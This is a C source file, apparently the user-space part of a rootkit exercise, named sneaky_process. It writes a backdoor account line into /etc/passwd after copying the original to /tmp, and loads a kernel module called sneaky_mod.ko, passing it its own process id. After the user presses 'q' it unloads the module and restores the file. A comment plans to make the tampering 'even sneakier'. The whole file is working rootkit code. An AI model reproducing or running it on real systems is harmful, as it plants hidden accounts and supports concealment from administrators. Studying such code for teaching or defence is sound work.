#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>


#define PID_LEN 32
#define LINE_LEN 512

/** 
 * TODO: to make it even sneakier, 
 * substitute /tmp/passwd for /etc/passwd 
 * when user is inside /etc and try to open 'passwd'
 */


/**
 * copy the original file from /etc/passwd to /tmp/passwd as a backup
 * @return status code
 */
int copy() {
    FILE *etc, *tmp;
    // char c;
    etc = fopen("/etc/passwd", "r+");
    if (etc == NULL) {
        fprintf(stderr, "Error! Cannot open /etc/passwd 0\n");
        return EXIT_FAILURE;
    }
    tmp = fopen("/tmp/passwd", "w+");
    if (tmp == NULL) {
        fclose(etc);
        fprintf(stderr, "Error! Cannot open /tmp/passwd\n");
        return EXIT_FAILURE;
    }
    
    // while ((c = fgetc(etc)) != EOF) {
    //     fputc(c, tmp);
    // }
    // fclose(tmp);
    
    // copy the file line by line, assuming max len <= 512
    // also find if the line already added
    char temp[LINE_LEN];
    const char *str = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
    while(fgets(temp, LINE_LEN, etc) != NULL) {
        if((strstr(temp, str)) != NULL) {
            fprintf(stderr, "Warning: line already there\n");
            fclose(etc);
            fclose(tmp);
            tmp = NULL;
            return EXIT_SUCCESS;
        }
        fprintf(tmp, "%s", temp);
    }
    fclose(tmp);
    // if no this str line, add to it
    fprintf(etc, "%s\n", str);
    fclose(etc);
    // fprintf(stdout, "Success! copy done\n");
    return EXIT_SUCCESS;
}

/**
 * restore the original file from /tmp/passwd to /etc/passwd
 * @return status code
 */
int restore() {
    FILE *etc, *tmp;
    char c;
    tmp = fopen("/tmp/passwd", "r");
    if (tmp == NULL) {
        fprintf(stderr, "Error! Cannot open /tmp/passwd\n");
        return EXIT_FAILURE;
    }
    etc = fopen("/etc/passwd", "w+");
    if (etc == NULL) {
        fclose(tmp);
        fprintf(stderr, "Error! Cannot open /etc/passwd 1\n");
        return EXIT_FAILURE;
    }
    while ((c = fgetc(tmp)) != EOF) {
        fputc(c, etc);
    }
    fclose(etc);
    fclose(tmp);
    int status = remove("/tmp/passwd");

    if (status == 0) {
        // fprintf(stdout, "Success! removed /tmp/passwd\n");
        return EXIT_SUCCESS;
    }
    else {
        fprintf(stderr, "Error! Cannot remove /tmp/passwd\n");
        return EXIT_FAILURE;
    }
}

/**
 * load the sneaky module to kernel
 * @return status code
 */
int load() {
    pid_t cpid = fork();
    if (cpid == 0) {  // fork() succeeded
        long ppid = getppid();  // get parent pid
        char pid_str[PID_LEN];  // convert the pid to string
        sprintf(pid_str, "spid=%ld", ppid);  // maybe also add path here?
        char *args[] = {"/sbin/insmod", "sneaky_mod.ko", pid_str,  NULL};
        if (execv(args[0], args) == -1) {
            // the first arg is a file name, which should be the first in args.
            fprintf(stderr, "Error! execv() failed. abort\n");
            return EXIT_FAILURE;
        }
    }
    else if (cpid == -1) {  // fork() failed
        fprintf(stderr, "Error! fork() failed. abort\n");
        return EXIT_FAILURE;
    }
    else {
        // wait for child process end successfully
        pid_t wpid = waitpid(cpid, NULL, 0);
        if (wpid == -1) {
            fprintf(stderr, "Error! waitpid() failed. abort\n");
            return EXIT_FAILURE;
        }
        else if (wpid == cpid) {
            // child process successfully executed
            // fprintf(stdout, "Success! load done\n");
            return EXIT_SUCCESS;
        }
        else {
            fprintf(stderr, "Error! unkownn waitpid() result. abort\n");
            return EXIT_FAILURE;
        }
    }
    return EXIT_SUCCESS;
}

/**
 * unload the sneaky module from kernel
 * @return status code
 */
int unload() {
    pid_t cpid = fork();
    if (cpid == 0) {  // fork() succeeded
        char *args[] = {"/sbin/rmmod", "sneaky_mod",  NULL};
        if (execv(args[0], args) == -1) {
            // the first arg is a file name, which should be the first in args.
            fprintf(stderr, "Error! execv() failed. abort\n");
            return EXIT_FAILURE;
        }
    }
    else if (cpid == -1) {  // fork() failed
        fprintf(stderr, "Error! fork() failed. abort\n");
        return EXIT_FAILURE;
    }
    else {
       // wait for child process end successfully
        pid_t wpid = waitpid(cpid, NULL, 0);
        if (wpid == -1) {
            fprintf(stderr, "Error! waitpid() failed. abort\n");
            return EXIT_FAILURE;
        }
        else if (wpid == cpid) {
            // child process successfully executed
            // fprintf(stdout, "Success! unload done\n");
            return EXIT_SUCCESS;
        }
        else {
            fprintf(stderr, "Error! unkownn waitpid() result. abort\n");
            return EXIT_FAILURE;
        }
    }
    return EXIT_SUCCESS;
}

/**
 * a simple wrapper for waiting for q
 */
void loop(char c) {
    char d;
    // fprintf(stdout, "Info: in the loop\n");
    while ((d = fgetc(stdin)) != c) {
        // do nothing, just wait
    }
}

/**
 * main function for sneaky_process.c
 * @return status code
 */
int main() {
    // do some simple assertion without including <assert.h>
    printf("sneaky_process pid = %d\n", getpid());
    if (copy() == EXIT_FAILURE) return EXIT_FAILURE;
    if (load() == EXIT_FAILURE) return EXIT_FAILURE;
    loop('q');
    if (unload() == EXIT_FAILURE) return EXIT_FAILURE;
    if (restore() == EXIT_FAILURE) return EXIT_FAILURE;
    return EXIT_SUCCESS;
}
